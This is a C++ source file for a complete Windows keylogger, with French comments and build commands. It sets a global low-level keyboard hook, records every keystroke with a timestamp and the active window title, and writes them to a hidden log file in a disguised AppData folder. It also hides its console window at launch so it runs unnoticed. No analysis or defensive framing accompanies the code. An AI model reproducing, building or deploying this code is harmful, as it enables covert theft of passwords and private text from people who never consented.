// language: C++17, file: src/tools/01_keylogger.cpp, target: Windows 10/11, MSVC/MinGW
// Keylogger WH_KEYBOARD_LL - log horodate avec titre de fenetre active
// MinGW: g++ -O2 -std=c++17 01_keylogger.cpp -o keylogger.exe -luser32
// MSVC : cl /O2 /EHsc /std:c++17 01_keylogger.cpp /link user32.lib
#include <windows.h>
#include <cstdio>
#include <ctime>
#include <string>
#include <mutex>

// pragma MSVC: user32 indispensable pour SetWindowsHookEx
#pragma comment(lib, "user32.lib")

static std::mutex g_mu;
static FILE* g_log = nullptr;

static std::string Now() {
    time_t t = time(nullptr);
    tm lt; localtime_s(&lt, &t);
    char b[32];
    strftime(b, sizeof(b), "%Y-%m-%d %H:%M:%S", &lt);
    return b;
}

static std::string ActiveWindow() {
    char title[256] = {0};
    HWND h = GetForegroundWindow();
    if (h) GetWindowTextA(h, title, sizeof(title));
    return title;
}

static std::string KeyName(const KBDLLHOOKSTRUCT* k) {
    // vk -> nom lisible via GetKeyNameText (scan code etendu)
    LONG sc = (k->scanCode << 16) | ((k->flags & LLKHF_EXTENDED) ? (1 << 24) : 0);
    char name[32] = {0};
    if (GetKeyNameTextA(sc, name, sizeof(name))) return name;
    char b[16]; snprintf(b, sizeof(b), "vk=0x%02X", k->vkCode);
    return b;
}

static void OpenLog() {
    char path[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", path, MAX_PATH);
    strcat_s(path, "\\RickCache");
    CreateDirectoryA(path, NULL);
    strcat_s(path, "\\sys.log");
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN);
    fopen_s(&g_log, path, "a");
}

LRESULT CALLBACK HookProc(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN)) {
        const KBDLLHOOKSTRUCT* k = (const KBDLLHOOKSTRUCT*)lp;
        std::string line = "[" + Now() + "] [" + ActiveWindow() + "] " + KeyName(k) + "\n";
        std::lock_guard<std::mutex> lk(g_mu);
        if (g_log) { fputs(line.c_str(), g_log); fflush(g_log); }
    }
    return CallNextHookEx(NULL, code, wp, lp);
}

int main() {
    // console invisible des le lancement
    FreeConsole();
    OpenLog();
    if (!g_log) return 1;
    // hook global bas niveau: pas de DLL requise, mais boucle de messages obligatoire
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, GetModuleHandle(NULL), 0);
    if (!hook) return 2;
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook);
    fclose(g_log);
    return 0;
}
